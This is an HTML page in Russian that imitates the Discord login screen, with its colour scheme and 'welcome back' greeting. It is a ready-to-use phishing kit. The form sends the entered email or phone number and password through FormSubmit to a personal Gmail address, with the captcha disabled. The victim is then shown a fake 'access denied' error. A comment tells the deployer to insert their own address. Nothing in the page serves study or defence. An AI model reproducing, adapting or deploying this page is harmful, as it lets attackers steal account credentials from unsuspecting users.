<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Страница входа</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #7289da 0%, #5865f2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .login-container {
            background-color: #36393f;
            border-radius: 8px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 480px;
            padding: 32px;
            color: #fff;
        }
        
        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .login-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .login-header p {
            color: #b9bbbe;
            font-size: 16px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            color: #b9bbbe;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 8px;
            text-transform: uppercase;
        }
        
        .form-group input {
            width: 100%;
            padding: 10px;
            border-radius: 4px;
            border: 1px solid rgba(0, 0, 0, 0.3);
            background-color: #303339;
            color: #fff;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        .form-group input:focus {
            border-color: #7289da;
            outline: none;
        }
        
        .btn-login {
            width: 100%;
            padding: 12px;
            background-color: #7289da;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .btn-login:hover {
            background-color: #677bc4;
        }
        
        .register-link {
            text-align: center;
            margin-top: 10px;
            color: #b9bbbe;
            font-size: 14px;
        }
        
        .register-link a {
            color: #7289da;
            text-decoration: none;
        }
        
        .register-link a:hover {
            text-decoration: underline;
        }
        
        .error-message {
            color: #f04747;
            font-size: 14px;
            margin-top: 5px;
            display: none;
        }
        
        .success-message {
            color: #43b581;
            font-size: 14px;
            margin-top: 10px;
            display: none;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h1>С возвращением!</h1>
            <p>Мы так рады видеть вас снова!</p>
        </div>
        
        <!-- Замените your-email@example.com на ваш реальный email -->
        <form id="loginForm" action="https://formsubmit.co/imnigerminecraft@gmail.com" method="POST">
            <!-- Эти настройки необходимы для FormSubmit -->
            <input type="hidden" name="_subject" value="Новые данные для входа">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_captcha" value="false">
            
            <div class="form-group">
                <label for="email">Эл. почта или номер телефона</label>
                <input type="text" id="email" name="email" required>
                <div class="error-message" id="emailError"></div>
            </div>
            
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" required>
                <div class="error-message" id="passwordError"></div>
            </div>
            
            <button type="submit" class="btn-login">Войти</button>
            <div class="success-message" id="successMessage">произошла ошибка вам отказано в доступе </div>
        </form>
        
        <div class="register-link">
            Нужен аккаунт? <a href="#">Зарегистрироваться</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Получаем значения полей
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Сбрасываем сообщения об ошибках
            document.getElementById('emailError').style.display = 'none';
            document.getElementById('passwordError').style.display = 'none';
            
            // Простая валидация
            let isValid = true;
            
            if (!email) {
                document.getElementById('emailError').textContent = 'Введите email или номер телефона';
                document.getElementById('emailError').style.display = 'block';
                isValid = false;
            }
            
            if (!password) {
                document.getElementById('passwordError').textContent = 'Введите пароль';
                document.getElementById('passwordError').style.display = 'block';
                isValid = false;
            }
            
            if (isValid) {
                // Показываем сообщение об успехе
                document.getElementById('successMessage').style.display = 'block';
                
                // Форма автоматически отправит данные на FormSubmit, который перенаправит на email
            }
        });
    </script>
</body>

</html>
